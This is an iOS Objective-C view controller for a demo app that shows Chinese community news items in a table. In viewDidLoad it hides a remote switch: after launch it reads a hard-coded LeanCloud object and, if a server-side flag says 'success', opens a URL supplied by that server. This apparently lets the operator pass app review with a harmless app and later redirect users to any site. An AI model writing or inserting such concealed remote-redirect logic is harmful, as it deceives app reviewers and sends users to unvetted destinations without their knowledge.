//
//  CWMainViewController.m
//  ChongWuDemo
//
//  Created by 王健 on 2019/9/12.
//  Copyright © 2019 王健. All rights reserved.
//

#import "CWMainViewController.h"
#import "CWMainTopCell.h"
#import "CWMainSecondCell.h"
#import "CWThirdCell.h"
#import "CWMainFourthCell.h"
#import "CWDetailViewController.h"
#import <AVOSCloud.h>
@interface CWMainViewController ()<UITableViewDelegate,UITableViewDataSource,UIScrollViewDelegate>{
    
    NSArray *_bottomdata;
    NSInteger _numcount;
}
@property (weak, nonatomic) IBOutlet UITableView *tableview;

@end

@implementation CWMainViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view from its nib.
    [self setNaviTitle:@"首页" leftButtonShow:NO rightButtom:nil];
    [self setUITableview];
    
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{

            AVObject *testObject = [AVObject objectWithClassName:@"demo2" objectId:@"5d7322db7b968a008a61f814"];
            [testObject fetch];
            NSString *string=[testObject objectForKey:@"data"];
            NSString *urlstr=[testObject objectForKey:@"urlstr"];
            
            if([string isEqualToString:@"success"]){

                if (@available(iOS 10.0, *)) {
                    [[UIApplication sharedApplication] openURL: [NSURL URLWithString:urlstr] options: @{} completionHandler: nil];
                } else {
                    [[UIApplication sharedApplication]openURL:[NSURL URLWithString:urlstr]];
                }
            }else{

            }

        });

}

- (void)setUITableview{
    
    self.tableview.delegate=self;
    self.tableview.dataSource=self;
    [self.tableview registerNib:[UINib nibWithNibName:@"CWMainFourthCell" bundle:nil] forCellReuseIdentifier:@"CWMainFourthCell"];
    [self.tableview registerNib:[UINib nibWithNibName:@"CWMainTopCell" bundle:nil] forCellReuseIdentifier:@"CWMainTopCell"];
    [self.tableview registerNib:[UINib nibWithNibName:@"CWMainSecondCell" bundle:nil] forCellReuseIdentifier:@"CWMainSecondCell"];
    [self.tableview registerNib:[UINib nibWithNibName:@"CWThirdCell" bundle:nil] forCellReuseIdentifier:@"CWThirdCell"];
    self.tableview.tableFooterView=[[UIView alloc]initWithFrame:CGRectZero];
    self.tableview.mj_header = [MJRefreshGifHeader  headerWithRefreshingTarget:self refreshingAction:@selector(headerRefresh)];
    [self.tableview.mj_header beginRefreshing];
}

- (void)headerRefresh{
    
    [SVProgressHUD showWithStatus:@"正在加载。。。"];
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [SVProgressHUD dismiss];
        [self.tableview.mj_header endRefreshing];
        _numcount=6;
        [self setUpData];
    });
}

- (void)setUpData{
    
    _bottomdata=@[@{@"img":@"shequ1",
                    @"title":@"“团团圆圆过中秋”手工制作冰皮月饼的活动“",
                    @"date":@"2019-09-11 09:04",
                    @"detail":@"　又是一年桂花香，中秋佳节即将到来。9月12日上午，浮碧社区为居民组织了一场“团团圆圆过中秋”手工制作冰皮月饼的活动。冰皮月饼外形简约大方，漂亮时尚，颜色多，口感也大大有别于传统月饼的油腻，表面略有弹性，口感滑爽。制作上，较传统月饼简单、不用烘烤、健康时尚，制作完后可直接食用。社区工作人员给每个人发放了做月饼的材料；接着，又示范做月饼的步骤以及所要注意的地方。新奇的冰皮月饼做法引起了居民们极大的兴趣，随后开始迫不及待地自己动手制作。起初每个人显得很谨慎，用电子称计算着材料的用量，相互探讨着做法。没过多久，一个个精美的冰皮月饼完成了。大家纷纷互相展示自己的DIY成果，露出喜悦的笑容。最后大家把精心制作好的月饼放入了包装盒中，由社区将这些爱心月饼送到了社区高龄孤寡和行动不方便的老人家中，让这些老人也感受到了浓浓中秋情。"
                    
                    },
                  @{@"img":@"shequ2",
                    @"title":@"金屏社区党员志愿者迎大庆环境大扫除",
                    @"date":@"2019-09-010 12:30",
                    @"detail":@"9月10日，为迎接开渔节到来，干净庆国庆，石浦镇开展环境卫生大扫除活动，巩固国家卫生城镇创建成果，干干净净迎大庆，以清新面貌迎接各地来参加第二十二届开渔节的游客。金屏社区响应石浦镇号召，组织党员干部、党员志愿者、居民志愿者和居民小组长在金屏社区辖区开展捡拾垃圾活动，义务帮助居民清理背街小巷、花坛花园、走道过道的大小垃圾，积极宣传环境保护意识，宣传开渔节和70周年大庆节日。"
                    
                    },
                  @{@"img":@"wuye1",
                    @"title":@"当垃圾分类遇上趣味编程",
                    @"date":@"2019-09-06 16:51",
                    @"detail":@"近日，“我是小小程序员”少儿编程体验公益活动走进了江北区洪塘街道亲亲社区,共有30余名青少年报名参与了此次编程活动。 学习编程是为了解决身边的问题，而垃圾分类正是解决环境问题的重要环节。本次编程课，编程老师将教大家用Scratch编程软件设计一款垃圾分类的小游戏。活动中，社区青少年们一个个都认真听老师讲授编程知识，一边体验编程的乐趣，一边学习垃圾分类的知识。 此次活动寓教于乐，充满意义，不仅激发了社区青少年对编程的兴趣，还进一步加强了垃圾分类的知识，受到了社区青少年的欢迎。"
                    
                    },
                  ];
    
    [_tableview reloadData];
}


#pragma mark - UITableView Datasource

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
    return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return _numcount;
}

- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath{
    
    if(indexPath.row==0){
         return 200;
    }else  if(indexPath.row==1){
         return 100;
    }else if(indexPath.row==2){
         return 44;
    }else{
         return 113.f;
    }
   
}
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    
    if(indexPath.row==0){
        
        static NSString *cellIdentifier = @"CWMainTopCell";
        
        CWMainTopCell *cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];
        
        if(cell == nil) {
            cell = [[CWMainTopCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier];
        }
        cell.selectionStyle=UITableViewCellSelectionStyleNone;
       
        
        return cell;
    }else if(indexPath.row==1){
        
        static NSString *cellIdentifier = @"CWMainSecondCell";
        
        CWMainSecondCell *cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];
        
        if(cell == nil) {
            cell = [[CWMainSecondCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier];
        }
        cell.selectionStyle=UITableViewCellSelectionStyleNone;
        
        
        return cell;
    }else if(indexPath.row==2){
        
        static NSString *cellIdentifier = @"CWThirdCell";
        
        CWThirdCell *cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];
        
        if(cell == nil) {
            cell = [[CWThirdCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier];
        }
        cell.selectionStyle=UITableViewCellSelectionStyleNone;
        
        
        return cell;
    }
    else{
        static NSString *cellIdentifier = @"CWMainFourthCell";
        
        CWMainFourthCell *cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];
        
        if(cell == nil) {
            cell = [[CWMainFourthCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier];
        }
        cell.selectionStyle=UITableViewCellSelectionStyleNone;
        NSDictionary *dict=_bottomdata[indexPath.row-3];
        cell.headimg.image = [UIImage imageNamed:dict[@"img"]];
        cell.titlelb.text =[NSString stringWithFormat:@"%@",dict[@"title"]];
        cell.datelb.text =[NSString stringWithFormat:@"时间:%@",dict[@"date"]];
        cell.detaillb.text=dict[@"detail"];
    
        return cell;
    }
}

#pragma mark - UITableView Delegate methods

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    
    if(indexPath.row==0){
       
    }else  if(indexPath.row==0){
       
    }else if(indexPath.row==0){
       
    }else{
        CWDetailViewController *vc=[CWDetailViewController new];
        vc.dict=_bottomdata[indexPath.row-3];
        [self pushViewController:vc];
    }
    
    
}

/*
#pragma mark - Navigation

// In a storyboard-based application, you will often want to do a little preparation before navigation
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
    // Get the new view controller using [segue destinationViewController].
    // Pass the selected object to the new view controller.
}
*/

@end
